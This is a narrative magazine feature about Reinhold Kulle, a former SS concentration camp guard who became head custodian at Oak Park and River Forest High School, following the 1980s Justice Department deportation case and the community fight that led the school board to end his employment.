<p>Geoghegan looked at the soon-to-be-American family in front of her. Reinhold and Gertrud Kulle made a handsome couple. He had kind eyes and a warm smile and answered her questions patiently. Their daughter, Ulricke, was 12; their 8-year-old son, Rainer, was the spitting image of his father.</p>



<p>Kulle had first contacted the consulate a few months earlier. It had sent him a detailed preliminary questionnaire to fill out, along with an information sheet, translated into German, that explained the application process and listed the classes of individuals who were ineligible for American visas.</p>



<p>Geoghegan looked over the paperwork and asked the family a series of questions through an interpreter.</p>



<p>Kulle had served in the German army, which was not surprising; nearly every German man had been conscripted by the end of the war. But on the preliminary questionnaire, he indicated that he had not been in any organizations that would have barred him from entry, and no derogatory information had come back from the consulate’s background check. He had a job waiting for him with a rivet company in Chicago, and a place to stay, with one of his wife’s relatives.</p>



<p>It was hard to imagine a better candidate. Geoghegan had just a few last questions that her bosses stressed she and other officials ask each candidate.</p>



<p>“Are you a member of the Communist Party?”</p>



<p>“Were you a member of the Nazi Party?”</p>



<p>“Were you a member of the Waffen-SS?”</p>



<p>Reinhold Kulle’s warm smile covered the dark secret he had closely guarded for over a decade. He had kept it in Krempe, the northern German town where the Kulles had fled after the war, and in Lahr, where they had moved after Rainer’s birth, and on the forms Reinhold had sent to the U.S. Consulate.</p>



<p>If Geoghegan somehow found out that he had been in the SS, a member of its elite Totenkopf (Death’s Head) division, and had served as a guard at Gross-Rosen, a forced-labor concentration camp in Silesia, now part of Poland, everything would be over.</p>



<p>But she didn’t.</p>



<p>Geoghegan signed visa application No. 6037. Reinhold Kulle was officially welcome in America.</p>





<p><span>W</span>ith its patchwork of ethnic neighborhoods, Chicago became one of the most common landing spots for former Nazis in the years after the war. Liudas Kairys, a guard at the Treblinka killing center in occupied Poland, was among the throngs of Lithuanian immigrants who settled on the Southwest Side. He arrived in 1949, claiming to be a displaced person, and took a job packaging candied popcorn at the Cracker Jack plant near Midway Airport. A few miles south, Hans Lipschis was often up early to work on his house. A Lithuanian member of the SS at Auschwitz, Lipschis came to Chicago in 1956 and found work at a factory making guitars. A year later, Conrad Schellong, a former concentration camp guard, moved to Lake View with his wife and three kids, living in several apartments within a few blocks of Wrigley Field. He worked as a welder and as a janitor for the <em>Chicago Tribune</em>. There were others, too — Michael Schmidt in suburban Lincolnwood, Joseph Grabauskas on the Southwest Side, Bronislaw Hajda in Schiller Park, and Juozas Naujalis in Cicero — so many that investigators would later joke that America’s Nazi-hunting organizations could have moved to Chicago and ignored the rest of the country.</p>



<figure><blockquote><p>Chicago became one of the most common landing spots for former Nazis after the war. Investigators would later joke that Nazi-hunting organizations could have just moved to Chicago.</p></blockquote></figure>



<p>The Kulles first stayed in suburban Forest Park, with Gertrud’s relative. Much of the land that became Forest Park had been purchased shortly before the Civil War by Ferdinand Haase, a German immigrant, and the village’s first major businesses were the German Waldheim Cemetery, the Deutsche Altenheim (German Old People’s Home), and Karl Lau’s sausage factory. Though it was becoming more ethnically diverse when the Kulles arrived, Forest Park still retained a large German cohort.</p>



<p>In 1959 there was an opening on the custodial staff at Oak Park and River Forest High School, and Kulle applied. He was quickly hired. Before he could officially start, he had to fill out paperwork. He did so in English, though he was still learning the language. In block letters, all capitalized, he wrote that he enjoyed gardening. During his physical, the medical examiner noted an “operational scar” on Kulle’s abdomen and “two wound scars” on his skin. Among the other papers in his personnel file was his marriage certificate, listing him as “SS-Unterscharführer Reinhold Kulle” and the registry office as “Groß-Rosen II.” Stamped on the bottom of the page, the Reichsadler eagle looked off into the distance, a swastika below its perch. If anyone at the high school was concerned, they kept it to themselves.</p>



<p>Kulle soon proved hard-working and indispensable. OPRF’s leadership took notice, and when the head night custodian fell ill in 1963, administrators asked Kulle to fill in. His English was still a work in progress, but he handled the added responsibilities well. When the ailing head custodian retired a few months later, Kulle was officially appointed his replacement.</p>



<p>Kulle’s steady work meant that his family could afford to move into a house of their own. Their first was a few blocks north of the Eisenhower Expressway on Harlem Avenue, the line separating Forest Park from Oak Park. It was just around the corner from Otto’s Restaurant, to which the Kulles could walk for schnitzel, Thuringer, calf’s liver, sauerbraten, and herring, and the kids could enjoy strudel or German chocolate cake for dessert.</p>



<p>Like Kairys, Lipschis, and Schellong, Kulle lived simply and quietly. He paid his bills, doted on Ulricke, and cheered for Rainer at wrestling matches. He avoided politics and stayed out of trouble. In his spare time, he gardened. He slipped into obscurity, just another blue-collar worker in Middle America with a thick accent and an untold past.</p>





<p><span>A</span>fter a dozen years at OPRF, Kulle had become every faculty member’s go-to. He knew where everything was, an impressive feat in a four-story behemoth of a building occupying an entire city block. Science teachers could count on him to escort students down to the school’s drafty basement to grab beakers, acids, and other materials for experiments. One day, he saw a colleague frantically setting up a college fair. When the man anxiously explained that he was running behind, Kulle immediately reassigned his crew to take over the setup.</p>



<p>His staff was among the best in the building, and the school was renowned for its cleanliness. Kulle rarely missed a day of work. He worked through injuries, like the time his hand had slipped through a glass window when he was cleaning it, or the time a few months later when he had stepped on a wooden board and nails had punctured his shoe, lacerating his foot.</p>



<p>Even as a supervisor, overseeing 30 custodians, Kulle continued washing hallway floors with the power scrubber and cleaning the library carpet on his hands and knees. A staff member once complained that Kulle’s hard work diminished opportunities for overtime, but Kulle took pride in keeping the building immaculate, and the faculty, administration, and staff respected him for it.</p>



<p>“At night,” a local newspaper explained, “he’s boss at [the] high school.” Tucked in the back pages of the Oak Leaves, the simple profile of the OPRF janitor described him warmly as a “refugee from East Germany” who kept the floors clean, the kids in line, and the school running on time. “There’s something in Reinhold Kulle’s voice that tells you he means it,” it began. The article was accompanied by a posed picture of Kulle: shoulders slightly hunched, a faint smile, and a short-sleeved work shirt tucked into his dark pants. His name was stitched in cursive above the pen in one breast pocket, and he had a small notebook in his other. Though he had gained a few pounds, he was still fit: his shoulders broad, his body solid. The huge ring of keys he typically carried for access to every room in the building was just out of sight.</p>



<p>At high school dances, explained Kulle in the article, he walked around to make sure students were not drinking. It was important to set a strict tone at the outset: “When you stop it the first night, then that’s all you have to do.” Although Kulle was often in contact with students, he did not get to know them well. He had learned somewhere in his past “not to get too close to [them] because those relationships might interfere with his enforcement of the school’s rules.” The high school was Kulle’s domain. “Whether it’s an evening class or a little theater event, Kulle is usually there, standing guard,” the paper noted.</p>



<p>Kulle had become something of an institution at OPRF. He adored the school, and the feeling was mutual. OPRF compensated him well — he earned more than many of the teachers. As his English improved, Kulle formed strong friendships with his colleagues, inviting them out to Oktoberfest celebrations and giving recommendations and reviews of Chicago’s German restaurants. Students in OPRF teacher Herr Schoepko’s German classes occasionally tried to practice with Kulle in the hallways. He would engage politely and briefly before returning to his work. A more awkward encounter came when the theater department asked whether the set for their production of <em>The Sound of Music</em> looked authentic. He shrugged; it was not worth explaining that he was a German citizen from a town that was now in Poland while the play’s story took place in Austria.</p>





<figure><img decoding="async" width="930" height="1024" src="https://www.chicagomag.com/wp-content/uploads/2024/08/kulle-collage-930x1024.jpg" alt="" srcset="https://www.chicagomag.com/wp-content/uploads/2024/08/kulle-collage-930x1024.jpg 930w, https://www.chicagomag.com/wp-content/uploads/2024/08/kulle-collage-436x480.jpg 436w, https://www.chicagomag.com/wp-content/uploads/2024/08/kulle-collage-768x846.jpg 768w, https://www.chicagomag.com/wp-content/uploads/2024/08/kulle-collage.jpg 1000w" sizes="(max-width: 930px) 100vw, 930px"><figcaption itemprop="caption">The school hired Kulle even though the marriage certificate it had on file for him had his SS rank, the concentration camp where he worked, and a Reichsadler eagle stamp. Top left: Kulle at his Brookfield home in 1983, at the time of his deportation hearing. <span>Photography: (Kulle) Chicago Tribune; (school) Pioneer Press</span></figcaption></figure>



<p><span>I</span>t wasn’t just any letter. It was from the Department of Justice, which had questions about the war and wanted to talk.</p>



<p>The summer usually brought calm. Just weeks earlier, the senior class had bidden OPRF a final farewell. Kulle was one year closer to retirement — to being at home with Gertrud in Brookfield, where they had moved after their children had left the house and married, to spending his days in the garden, to having more time with the grandkids. After the graduation ceremony, the custodial staff broke down the chairs and cleaned up from the event. Soon the building would be quiet again.</p>



<p>But at the end of July 1982, the Kulles received formal correspondence from the deputy director of the Justice Department’s Office of Special Investigations, created to track down Nazis and their collaborators now living in the United States. OSI had scheduled a meeting with Kulle, and because he was not a U.S. citizen, he had no choice but to go. Gertrud told OSI attorney Bruce Einhorn that Reinhold would take OSI up on its offer to provide an interpreter.</p>



<p>On Saturday morning, August 14, Einhorn waited for Kulle at the Midland Hotel in downtown Chicago. He placed an American flag on OSI’s side of the table. Kulle might not have noticed, but the symbolism was important to the 29-year-old curly-haired prosecutor. Einhorn, a Jewish kid from Brooklyn and the descendant of a prominent American rabbi, would be standing over a Nazi.</p>



<p>Einhorn had a file of documents gathered over the past year from the Berlin Document Center and the Immigration and Naturalization Service. They were more than OSI could have hoped for. The documents included not only Kulle’s SS personnel file but the marriage application Kulle had filed with the Reich Security Main Office. They had Kulle, in his own handwriting, detailing his Nazi history, proudly recalling his time in the Hitler Youth and Waffen-SS, and assuring Reichsführer Heinrich Himmler that there were no Jews in Kulle’s bloodline. They even had photos of him in his SS uniform.</p>



<p>When Kulle arrived, Einhorn was almost relieved by his appearance. Now 61, Kulle still had a powerful frame, though his hair was thinning on top. Most important, he looked exactly like he did in the photos OSI had of him in uniform. Kulle had come without an attorney, and the interview began just before 11 a.m.</p>



<p>Einhorn walked through Kulle’s childhood in Silesia. “Have you always gone by that name?” “Where and when were you born?” “What was your father’s name?” More questions, straight from Kulle’s SS files, followed. “Have you ever had the measles?” “Did you ever have scarlet fever?” “You are approximately 170 centimeters tall?” The questions seemed innocuous enough. They were confirming, though, that the Reinhold Kulle of Gross-Rosen, Silesia, was the Reinhold Kulle of Brookfield, Illinois.</p>



<p>Kulle freely acknowledged having volunteered for the SS and joining the Death’s Head division. He described his service in occupied France and the wounds he had suffered on the eastern front. He answered before the questions could be translated into German. Einhorn repeatedly reminded him to wait for the translation, but it was clear that Kulle’s English was now quite fluent.</p>



<p>Einhorn asked whether he had received any decorations for his service. Yes, Kulle said, but they had been lost when the family fled Silesia. He did have a picture to show Einhorn: one of him in his uniform, with the Death’s Head insignia, and with patches and stripes that denoted the medals he had received. The photograph was one of the only items Kulle still had from the war, a remnant he had managed to keep and protect for nearly 40 years. Einhorn looked at the photo and then up at Kulle.</p>



<p>“I take it this photograph means a great deal to you,” he said.</p>



<p>Kulle dismissed the remark. “It doesn’t mean anything today.”</p>



<p>Though he freely acknowledged his military service, Kulle was coy about anything connected to Nazi persecution. He tried to portray his time at Gross-Rosen as strictly military duty, saying he had nothing to do with the prisoners and was only at the camp to train recruits. He clearly understood that admitting to more could spell trouble, but once he had acknowledged that he was the same Reinhold Kulle who had been born on March 5, 1921, in Breslau, in the then-German province of Silesia, his protestations were of little value.</p>



<p>Once back in Washington, D.C., Einhorn and his colleagues prepared to begin formal deportation proceedings.</p>





<p><span>F</span>or two days that December of 1982, OPRF superintendent Jack Swanson walked through the Oak Park community, almost singularly carrying a bombshell. So far, the school had been spared any publicity. The <em>Sun-Times</em> article had not mentioned OPRF, and the <em>Chicago Tribune</em> had misidentified Kulle as a custodian at an elementary school in Brookfield.</p>



<p>But it was only a matter of time. Eric Linden, the lead reporter for Oak Park’s <em>Wednesday Journal</em>, had already asked for a comment. Swanson exuded his typical patience and calm, responding that Kulle was “an exemplary employee who will continue to work here at least until some kind of a court decision is made.” It was premature to do anything else, he explained. Everyone just needed to let the legal process play out.</p>



<p>That Monday afternoon, Swanson asked Kulle to come to his office before his shift began. Everyone knew that Kulle had been in the German army. He used to joke with the American veterans on his staff about the possibility they had shot at each other back in Europe. But a concentration camp guard? Reinhold? There was no way.</p>



<p>Swanson could not change the past, but he certainly wished the revelations had not been unearthed. He could never know exactly what had happened a lifetime ago and a world away. But he knew Reinhold, the kind of man he was now. They had become friends. He dreaded having to ask him about the allegations. His focus needed to be on the future, on students, on the budget. It was his job to do what was best for the school, and Kulle was an irreplaceable asset.</p>



<p>Kulle walked in, his collared short-sleeved work shirt covering the slight paunch of middle age. Swanson looked him in the eye and asked if the allegations were true. Had he really been a guard at a Nazi concentration camp?</p>



<p>Yes, Kulle told Swanson, he had worked at Gross-Rosen, but he had never even fired his rifle. It was just a prison, he added.</p>



<p>And he hadn’t said this on his visa application?</p>



<p>No, Kulle admitted. He had not.</p>



<p>And he had been in the Hitler Youth?</p>



<p>Yes, Kulle answered. He had joined the Nazi youth movement as a teenager, but he had never been an active participant.</p>



<p>Swanson peered through the large, thin-framed glasses that crossed his angular face. Kulle looked uneasy, as if he knew he was in trouble. Swanson was not finding his answers convincing. But after 23 years, Kulle had earned some compassion, some grace.</p>



<p>Swanson had to determine how to navigate OPRF through the ordeal to come. He hoped it would all just go away. Kulle had been a young man in the war, doing what everybody else at the time was doing there. And so many years had passed. The man at Gross-Rosen, Swanson told himself, had been a different Reinhold Kulle.</p>





<p><span>E</span>arly one August morning in 1983, RaeLynne Toperoff was reading the <em>Chicago Tribune</em> at home in Oak Park, enjoying a day off from the summer program she was teaching. The veteran Chicago Public Schools educator flipped through a dozen pages full of advertisements for back-to-school sales.</p>



<p>Then, above a large ad for a new Apple computer, the word “Nazi” caught her eye. Another of Hitler’s men had been caught. Good, she thought, scanning the short article about a deportation hearing.</p>



<p>Then she saw it.</p>



<p>“The Oak Park school maintenance man…” She read the line over and over, thinking her eyes were playing tricks on her. How had she not heard about this before? She thought about her school-age kids. At which school was this Reinhold Kulle working?</p>



<p>Toperoff grabbed her phone and called Rima Lunin Schultz, a close friend from her synagogue. Toperoff began to explain what she had read but soon gave up and instead scurried the four blocks to Lunin Schultz’s house to tell her in person.</p>



<figure><blockquote><p>There was one question that RaeLynne Toperoff could not get out of her head: Why, if it was already determined that Reinhold Kulle was a known member of the SS, was he still employed at the high school?</p></blockquote></figure>



<p>They tried to figure out where the hearing was being held. Something they could not yet articulate was compelling them to go, to witness the proceedings. From Lunin Schultz’s kitchen, they called local leaders, Jewish organizations, anyone they could think of. “Where is this happening?” they kept asking, but nobody seemed willing or able to tell them. Exasperated, Lunin Schultz called the Justice Department itself.</p>



<p>“I’d like to speak to whomever is involved with the matter of Reinhold Kulle,” she said. She was put through to Einhorn’s hotel room, and the attorney told her how to get to the courtroom at the Dirksen Federal Building in downtown Chicago.</p>



<p>Toperoff and Lunin Schultz raced the two blocks south to the L stop and boarded the Green Line train. By the time they entered the courtroom 45 minutes later, the hearing was well underway. Toperoff looked over to the defense table. There he was, this Nazi, this Kulle, sitting in an American courtroom, getting due process and a prominent lawyer.</p>



<p>On the other side of the courtroom, by the OSI table, several elderly women sat together. Lunin Schultz and Toperoff knew instantly that they were survivors. Without saying a word, they walked over to sit with the women. They looked around the courtroom to see whether anyone else they knew from Oak Park had come. Sure enough, a contingent sat on Kulle’s side of the room, near a cadre of neo-Nazis. Toperoff and Lunin Schultz stared in disbelief. Their neighbors had walked into the same contrast they had seen — Holocaust survivors on one side, a former Nazi on the other — and had chosen their seats differently.</p>



<p>At the end of the long and emotionally exhausting day of testimony, there was one question that Toperoff could not get out of her head: Why, if it was already determined that Kulle was a known member of the SS, was he still employed at the high school?</p>





<p><span>A</span>s the first phase of the hearing came to a close, 20 members of the high school’s maintenance staff wrote a public letter chastising the <em>Oak Leaves</em> for reporting on the proceedings in a “sensational manner” and for not including “even one item in support of Mr. Kulle.” Had the paper sent reporters to OPRF, Kulle’s colleagues wrote, it would have learned that Kulle was “held in high esteem at the high school” and that the “school and community are just a little better because Mr. Kulle has been here.”</p>



<p>RaeLynne Toperoff put down the paper in a fit of disgust. “The same cannot be said of his Gross-Rosen victims,” she thought. The next week, as if in response to the custodial staff’s letter to the <em>Oak Leaves</em>, the <em>Wednesday Journal</em> sent Eric Linden to the high school. Kulle’s boss, the assistant director of buildings and grounds, told the reporter that Kulle remained “respected” and “popular” and that the charges had “not changed that impression.”</p>



<p>Rima Lunin Schultz was following OSI’s other cases, and she knew that those situations were difficult. There was little precedent for how a community or an employer should handle such allegations. But Oak Park was supposed to be different. It was, she explained to anyone who would listen, “better equipped to deal with these kinds of issues than other communities.”</p>



<p>Each Wednesday, Lunin Schultz opened the weekly papers with trepidation, anxiety, and a pair of scissors, collecting each article and letter about Kulle and placing them in a box. She and Toperoff bristled at Linden’s gentle portrayals of Kulle and at the absence of historical context about the slave labor at Gross-Rosen. They were relieved to see, in the middle of September, that they were not entirely alone. Three men sent a letter to the <em>Wednesday Journal</em> expressing outrage at the “good guy image” in Linden’s recent piece.</p>



<p>Still, the women knew they were in the minority. Linden said as much when Toperoff called him. Kulle’s colleagues still supported him, the school continued to employ him, and even the local press was sympathetic. Kulle seemed to have the support of Oak Park’s most powerful institutions.</p>



<p>Searching for allies, Lunin Schultz, Toperoff, and their husbands attended a meeting of a small new group organized by Bruce and Julie Samuels, who were active in progressive politics and environmental issues in town. Bruce Samuels thought the Kulle situation was a symptom of an ignorance of history, especially Holocaust history, and he hoped to push the high school to improve its curriculum. His goals were expressed in the lofty name of the group: Coalition for an Informed and Responsible Citizenry.</p>





<p><span>T</span>hat October, the school board received an anonymous letter, seemingly from faculty members, requesting that Kulle not be removed. Riddled with antisemitic tropes, the letter had harsh words for Lunin Schultz and Toperoff: “We are concerned that a small minority are acting immorally, ungodly, and unAmerican, trying to force their selfish, narrow pointed opinions on the rest of the community.” The writers contended that Kulle was being unfairly condemned “because he joined an organization over 45 years ago when he was 18 or 19 years of age.”</p>



<p>With a legal case ongoing, the letter said, there was “no justification for a small group to take the law into their own hands.” The letter characterized anti-Kulle sentiments as an “undemocratic … attitude of guilt by association” and asked the school board to judge the case “on the facts presented to the Federal government” and not “on the emotions of a small minority of citizens in Oak Park.” Though it argued that Kulle should be considered “innocent until proven guilty,” it also criticized the Coalition for an Informed and Responsible Citizenry for being “completely unforgiving.”</p>



<p>One of the first Oak Parkers to speak out publicly in Kulle’s defense was a student at the high school, who declared the head custodian “one reason to be proud of [the] school.” Toperoff was crushed when she saw the girl’s name in the <em>Oak Leaves</em>. Their families were friendly, and her son and the girl were close. The student argued that Kulle did not deserve “the mistreatment and verbal abuse that gets printed in the paper. … Mr. Kulle is a very kind and friendly man at school and I am sure that he is not proud of his Nazi background.”</p>



<p>Lunin Schultz had expected Kulle’s family, and even some friends and colleagues, to support him. But now the community’s children were standing up for a former concentration camp guard. Lunin Schultz was left deeply unsettled. What was happening at the high school?</p>



<p>She had barely calmed down the next day when she received a letter from John Lukehart, the idealistic chair of Oak Park’s Community Relations Commission. He thanked her and Toperoff for bringing the Kulle matter to the commission’s attention and attached a letter he had sent to the school board. “Mr. Kulle is a public employee, paid with public funds,” Lukehart wrote. “He is visible to the community in his present job. Given the above observations, it is the commission’s judgment that the Board of Education should put Mr. Kulle on a leave of absence immediately.”</p>



<p>Then Lukehart went a step further, beyond even what Lunin Schultz and Toperoff had called for: “The Community Relations Commission further believes that, should Mr. Kulle’s involvement as a member of the Nazi SS be substantiated, regardless of the outcome of the present judicial proceedings, the School Board should terminate his employment immediately.”</p>





<p><span>B</span>y now, Kulle was a constant topic of debate in the local papers, and both the <em>Tribune</em> and the <em>Sun-Times</em> had been covering the hearing. One of Kulle’s friends called Rich Deptuch, the beloved head of the school’s math department, to ask what the staff could do to help Kulle, and Deptuch agreed that it was time to make sure the school board knew how the faculty felt. Other teachers had approached Deptuch as well, hoping to help a friend. On at least one occasion a colleague expressed explicit antisemitism, and Deptuch immediately shut the conversation down. He would not tolerate bigotry. Nor was it his place to decide Kulle’s guilt.</p>



<p>In early November, Deptuch drafted a petition to the board stressing the “positive influence” Kulle had and arguing that “accusations of Reinhold’s alleged criminal misconduct as a member of the German SS nearly 40 years ago should have no bearing on his opportunity to continue to provide such valuable services to the school.” The final paragraph urged the school board to wait until a court ruling before making a decision regarding Kulle’s employment. Deptuch made several hundred copies of the petition at a local printer and distributed them in faculty mailboxes the next day.</p>



<figure><blockquote><p>One math teacher drafted a petition arguing that Kulle’s actions “nearly 40 years ago should have no bearing on his opportunity to continue to provide such valuable services to the school.”</p></blockquote></figure>



<p>Though the majority of the staff members were solidly in Kulle’s corner, there were exceptions. At a faculty meeting that fall, history teacher Michael Averbach had given an impassioned speech. It was not simply a legal case, he had said, or even a moral one; the school had a pedagogical responsibility to fire Kulle. “How can we tell kids that what they do at 16 or 17 matters,” he had pleaded, “if we say that what Reinhold did at 20 or 21 doesn’t?” Keeping Kulle employed, Averbach argued, would undermine everything the school claimed to be.</p>



<p>The school board had hoped that the legal system would take the decision out of its hand, but even now, after the hearing had ended and Kulle awaited a ruling, a fundraising note addressed to the “Friends of Reinhold Kulle” and asking for contributions to his defense made it clear that Kulle had no interest in a quick resolution. The case, it said, would “probably require appeal.”</p>



<p>That December, shortly before a school board meeting, Lunin Schultz, Toperoff, and a few others gathered to strategize. They needed to find a way to force the board to discuss Kulle in open session; the board had declared the matter a “personnel issue,” one that could be discussed only behind closed doors.</p>



<p>Back in October, Bruce Samuels had asked, almost sarcastically, whether the school had a policy about employees’ memberships in questionable organizations. What if, Lunin Schultz suggested, they asked the board to adopt a policy against employing former Nazis? There was something elegant about the idea. They would not mention Kulle by name. The discussion would remain theoretical, and the board would not be able to hide behind the “personnel issue” buffer.</p>



<p>The group had little interest in an actual policy — it seemed entirely unlikely that OPRF would be in this position again — but the proposal would box the school board into a corner. Driving home that evening, Lunin Schultz felt a weight coming off her chest.</p>





<p><span>T</span>here were few empty chairs at the next school board meeting. Lunin Schultz recognized many of the visitors, but the Kulle issue seemed to cast a wide net. Neo-Nazis were an increasing presence in front of the school, passing out booklets denying the Holocaust. Some of them even tried to speak on Kulle’s behalf at school board meetings, but lacking Oak Park addresses, they were denied.</p>



<p>The board and the administration took their seats just after 7:30 p.m. and proceeded with typical housekeeping. After agreeing to draft a letter of appreciation to a retiring engineer, the board ceded the floor to the superintendent. But the large crowd certainly had not come to hear him discuss the new geometry textbooks. The meeting continued with a long list of items — everything but Kulle.</p>



<p>Finally, it was time for public comments. Gignilliat, the school board president, issued a reminder that the board would hear discussion of policy but that personnel issues would be reserved for executive session. Toperoff tried to cover a wry smile as Michael Fleisher, a member of the Coalition for an Informed and Responsible Citizenry, rose to address the board.</p>



<p>The board’s refusal to take action, he asserted, jeopardized “the first obligation of the high school” — to train its students to make informed and moral decisions. After pushing for more specifics on a statement the board had made earlier about the school reviewing its Holocaust curriculum, Fleisher shifted to his group’s ultimate demand. “We urge action based on a moral principle,” he said. A recent statement by Gignilliat had said that the board would not act on the Kulle matter until it had all of the “relevant information.” “If you are awaiting a legal decision by a hearing officer and/or continue to see this as a narrow personnel matter, you have misunderstood the issue,” Fleisher said. “We request an answer: Should a person who has voluntarily served in the SS be considered a suitable employee of District 200?”</p>



<p>Fleisher handed the board members copies of his statement, which had 40 signatures at the bottom, and returned to his seat. A few other speakers followed him, but even as they talked, his words kept a firm hold on the room.</p>



<p>Some of the board members grew defensive, and the discussion began to unravel. William “Jay Jay” Turner, the only Black member of the school board, tried to reestablish order. Thanking Fleisher for his statement, he pointed out that the members of the Coalition for an Informed and Responsible Citizenry had taken time to formulate their ideas together, and the school board needed to do the same.</p>



<p>At 10:15 p.m., Turner moved for the board to go into closed session in Swanson’s office. Almost exactly a year earlier in this very room, Swanson had first learned of Kulle’s Nazi past from the <em>Sun-Times</em> article. Swanson, who had unsuccessfully urged Kulle to take an early retirement, could tell he was losing the board members’ support. Kulle was just “a simple sergeant,” he argued. “Why was he getting blamed for everything the Nazis did?”</p>



<p>It was now past midnight, nearly five hours after the meeting had begun. The board members were all haggard, emotional, and drained. Deptuch’s petition, Fleisher’s speech, and the continued increase in attendance at school board meetings made it clear to everyone in the room: A decision regarding Kulle’s employment had to be made, separate from the outcome of the legal case.</p>





<p><span>D</span>eliberations resumed in the high school’s boardroom on the morning of January 14, 1984. Kulle was asked to attend, but before he arrived, one board member recounted a harrowing conversation he’d had with a former Gross-Rosen prisoner. Gignilliat was struck by the fact that the number of reported deaths at the camp was almost the same as the entire population of Oak Park.</p>



<p>At 9:20 a.m., Kulle joined the meeting with his attorney, who gave prepared remarks. The board members then took turns interviewing him.</p>



<figure><blockquote><p>“Tell us exactly how you feel,” one school board member asked Kulle, hoping for clarity. “I feel bad, very bad,” Kulle said. “I just wished we had won the war.”</p></blockquote></figure>



<p>Turner had been reading everything he could about Gross-Rosen and had grown convinced that Kulle was responsible for a lot of dastardly things. When his turn to interview Kulle came, he stared across the table and asked him whether he had seen prisoners. No, Kulle responded, he had been on the outskirts of the camp. Turner abruptly changed the subject: He asked how Kulle’s promotions at Gross-Rosen had affected his relationship with Gertrud’s father. Then he switched back, asking Kulle whether he had ever done anything kind for the prisoners. Kulle told Turner the same stories he had told in court: He had brought chickens to a prisoner once, given water to another.</p>



<p>Which was it? Turner thought. Had Kulle been away from the prisoners, or had he brought them gifts? It was all Turner needed to hear. Kulle was lying.</p>



<p>Other questions followed from other board members, but Kulle claimed to recall very little from Gross-Rosen.</p>



<p>Had he ever shot anyone?</p>



<p>“I don’t remember.”</p>



<p>Had he ever abused or tortured a prisoner?</p>



<p>“I don’t remember.”</p>



<p>Had he ever killed anyone?</p>



<p>“I don’t remember.”</p>



<p>Gignilliat found the answers eminently frustrating. Kulle was certainly not helping his cause. Killing someone seemed like a thing a man would remember.</p>



<p>Finally, board member Carl Dudley, a minister and professor at a nearby theological seminary, tried to break through. It had been a tense day, and the stress of the entire situation was wearing on everyone. “Reinhold, how do you feel? Do you feel guilty? Do you feel that the things you did were wrong?”</p>



<p>“Yah, yah, I feel bad. I feel bad about the whole situation,” he responded.</p>



<p>“Tell us exactly how you feel,” Dudley implored, hoping for some kind of clarity.</p>



<p>“I feel bad, very bad,” Kulle said. “I just wished we had won the war.”</p>





<p><span>A</span>n envelope addressed to Reinhold Kulle arrived at OPRF that January. Inside were two pension estimates from the Illinois Municipal Retirement Fund. They would prove instructive.</p>



<p>The policy proposal against employing Nazis had indeed boxed the school board into a corner, and Kulle’s answers to Dudley’s questions had done him no favors. One by one, school officials were coming to terms with the gravity of the situation. Gignilliat, who had long held out hope that they could weather the storm, now recognized that it would be impossible to retain Kulle.</p>



<p>Back in December the board had promised a response to Fleisher by its January 24 meeting, but as the meeting neared, no statement had been released. Growing impatient, Lunin Schultz and Toperoff distributed a note urging friends to attend the upcoming meeting, hoping their presence would help “bring about a sound policy on this issue.” Attached to the note was a petition from Fleisher requesting substantive responses to the questions he had raised at the previous meeting. He planned to speak again.</p>



<p>Finally, on January 18, the school board released a statement. In large part a response to Fleisher, it pushed back on the suggestion that the board adopt a resolution condemning racism and genocide, which “would imply that the board has not previously condemned those heinous ideas and acts.” Quoting board policies, the letter stressed the district’s commitment to both moral concerns and diversity and reiterated that an ongoing curriculum review was underway.</p>



<p>At the end of the statement, Gignilliat addressed the board’s decision process. These were complicated issues, he explained, and it was precisely because “the board is well aware of the impact this matter has had on our community” that it would “continue to seek counsel as needed, act with prudent deliberation, and resist attempts to precipitate a premature decision.” It would announce a final decision when members had all the necessary and relevant information and when they were sure they could do so without abridging Kulle’s rights.</p>



<p>Lunin Schultz could not understand what “necessary and relevant information” the board still needed. What new information could possibly come out?</p>



<p>But Gignilliat felt that a decision of this magnitude would have to be unanimous, and the board would need the administration’s support. It could not just summarily fire Kulle and move on — not after a quarter century of service. As important as it was to end what had become a public relations nightmare for the school, the board hoped to somehow avoid hurting Kulle financially. The two IMRF simulations provided some clarity. The first estimated Kulle’s pension if he retired at the end of the school year; the second if he waited two more years and retired in July 1986.</p>



<p>Over the next few days, Gignilliat, the school board, and the administration weighed their options. Quietly, slowly, carefully, they crafted a way out — one they would shroud in secrecy for decades.</p>





<p><span>O</span>n the evening of January 24, 1984, Toperoff waited nervously for the school board meeting to begin. Word had gotten out that the board planned to make an announcement about Kulle. To accommodate the large crowd that was expected, the board moved the meeting to one of the school’s auditoriums. Toperoff’s husband, Gil, sat on one side of her; Lunin Schultz and her husband, Richard, on the other. Friends were clustered in nearby rows. Herr Schoepko, the school’s German teacher and Kulle’s friend, settled into a seat behind them.</p>



<p>The room grew quiet. Oak Parkers were still filtering into the few remaining seats. After some formalities, Gignilliat announced that he was going to read a statement and that visitors would not be allowed to comment until later in the meeting.</p>



<p>Toperoff took a deep breath.</p>



<p>“In recent months,” Gignilliat began, “this board has devoted considerable time and attention to Reinhold Kulle’s employment in the district.”</p>



<p>The room was eerily quiet. Gignilliat read slowly and deliberately: “The board understands that under present law, no guard at a Nazi concentration camp would be permitted to immigrate to the United States.”</p>



<p>Toperoff looked to her husband, and to Lunin Schultz.</p>



<p>“As a member of the noncertified supervisory staff, Mr. Kulle does not have a written employment contract.”</p>



<p>The crowd was now becoming animated, whispers growing louder.</p>



<p>“The law does not compel the board either to reemploy or to terminate Mr. Kulle. The paramount considerations are and have been moral issues, including fairness to Mr. Kulle. Fairness to Mr. Kulle suggested to the board that it do nothing to interfere with his defense during the deportation hearing. The hearing has concluded. The board has obtained all the necessary relevant information, has been deliberate in its consideration, and is now prepared to act.”</p>



<p>Lunin Schultz tried to quell her frustration at the revisionist history of the last 13 months.</p>



<p>“The board is unwilling to show less than utter revulsion for the Nazi horrors. In making a decision, the board rejects any suggestion that to terminate Mr. Kulle’s employment involves notions of ‘guilt by association.’ It is not the board’s charge to decide whether Mr. Kulle is ‘guilty’ in that sense; nor does the board wish to prejudice his employment in the private sector. It is simply that no former guard at a Nazi concentration camp will be employed by this district. In a public school supported by public funds for educational purposes, the goal is to teach that each individual must accept responsibility for personal behavior and its implications for society.”</p>



<p>It was strong rhetoric, and the crowd was responding strongly as well. Around Toperoff there were smiles and tears of exhaustion; behind her, groans of frustration and murmurs of discontent.</p>



<p>“Accordingly,” Gignilliat continued, “Mr. Kulle will not be reemployed as of July 1, 1984, and is placed on terminal leave of absence effective January 25, 1984. Because the performance of his duties has given no legal cause to end his employment status or to cease compensating him, he will continue to receive his salary until June 30, 1984.”</p>



